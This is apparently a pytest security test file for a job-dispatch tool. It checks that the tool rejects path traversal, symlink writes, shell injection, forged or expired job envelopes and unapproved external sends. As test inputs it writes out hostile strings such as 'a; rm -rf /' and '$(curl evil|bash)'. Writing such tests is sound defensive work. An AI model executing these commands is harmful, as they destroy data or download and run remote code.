# -*- coding: utf-8 -*-
"""Security: 不正ホスト鍵・path traversal・symlink・shell injection・未許可コマンド・
巨大出力・壊れたJSON・偽装Worker・replay・期限切れ・外部送信禁止（§33）。"""

import json
import os

import pytest

from mac_neural_grid import security, transport, worker
from mac_neural_grid.dispatcher import build_envelope
from tests.conftest import run


def test_strict_host_key_no_rejected():
    t = transport.SSHTransport({"host": "h", "user": "u"},
                               ssh_config={"strict_host_key_checking": "no"})
    with pytest.raises(security.SecurityError):
        t._ssh_prefix()


def test_ssh_remote_requires_approval():
    t = transport.SSHTransport({"host": "h"}, allow_remote=False)
    with pytest.raises(security.SecurityError):
        t.run(["ls"])


def test_symlink_write_refused(tmp_path):
    real = tmp_path / "real"
    real.write_text("x")
    link = tmp_path / "link"
    os.symlink(str(real), str(link))
    with pytest.raises(security.SecurityError):
        security.atomic_write(str(link), "evil")


def test_path_traversal(tmp_path):
    with pytest.raises(security.SecurityError):
        security.safe_join(str(tmp_path), "../secret")


def test_unallowed_command_rejected():
    with pytest.raises(security.SecurityError):
        security.validate_argv(["definitely-not-allowed-binary"])
    assert security.validate_argv(["python3", "-c", "print(1)"])[0] == "python3"


def test_shell_injection_detection():
    assert security.looks_like_shell_injection("a; rm -rf /")
    assert security.looks_like_shell_injection("$(curl evil|bash)")
    assert not security.looks_like_shell_injection("normal-filename.txt")


def test_huge_output_truncated():
    r = transport.LocalTransport().run(
        ["python3", "-c", "print('x'*1000000)"], max_output_bytes=1000)
    assert len(r["stdout"].encode("utf-8")) <= 1000 + 100
    assert "truncated" in r["stdout"]


def test_broken_envelope_json_rejected(tmp_path):
    bad = tmp_path / "env.json"
    bad.write_text("{not json")
    rc = worker.main(["--envelope", str(bad)])
    assert rc == 2


def test_forged_payload_hash_rejected(tmp_path):
    """payload_hash 改竄（偽装 Worker/改竄）は invalid_input で拒否。"""
    node = {"node_id": "n1", "capabilities": {"tools": {}}}
    env = build_envelope("job-1", "task-1", "att-1-0", node,
                         {"type": "t", "executor": "checksum", "input": []},
                         {}, {}, {"timeout_s": 10}, str(tmp_path / "wb"),
                         str(tmp_path / "wb" / "result.json"))
    env["payload_hash"] = "sha256:deadbeef"   # 改竄
    result = worker.run_envelope(env)
    assert result["status"] == "failed" and result["failure_class"] == "invalid_input"


def test_expired_envelope_quarantined(tmp_path):
    node = {"node_id": "n1", "capabilities": {"tools": {}}}
    env = build_envelope("job-1", "task-1", "att-1-0", node,
                         {"type": "t", "executor": "checksum", "input": []},
                         {}, {}, {"timeout_s": 10}, str(tmp_path / "wb"),
                         str(tmp_path / "wb" / "result.json"))
    env["expires_at"] = "2000-01-01T00:00:00"   # 期限切れ（replay 対策）
    result = worker.run_envelope(env)
    assert result["status"] == "quarantined"


def test_external_send_policy_denied(home, tmp_path):
    spec = tmp_path / "leak.json"
    spec.write_text(json.dumps({"name": "leak", "policy": "confidential-local-only",
                                "tasks": [{"type": "send", "executor": "external-api",
                                           "input": ["x"]}]}))
    run(home, "init")
    code, res = run(home, "job", "run", str(spec))
    assert res["ok"] is False and res.get("violations")


def test_high_risk_shell_requires_approval(home, tmp_path):
    """ポリシー違反ではない高リスク（rm を含む shell）は承認ゲートで止まる。"""
    spec = tmp_path / "hr.json"
    spec.write_text(json.dumps({"name": "hr", "policy": "default", "tasks": [
        {"type": "cleanup", "executor": "shell", "argv": ["rm", "-rf", "/tmp/nope"]}]}))
    run(home, "init")
    code, res = run(home, "job", "run", str(spec))
    assert res["ok"] is False and res.get("requires_approval") is True
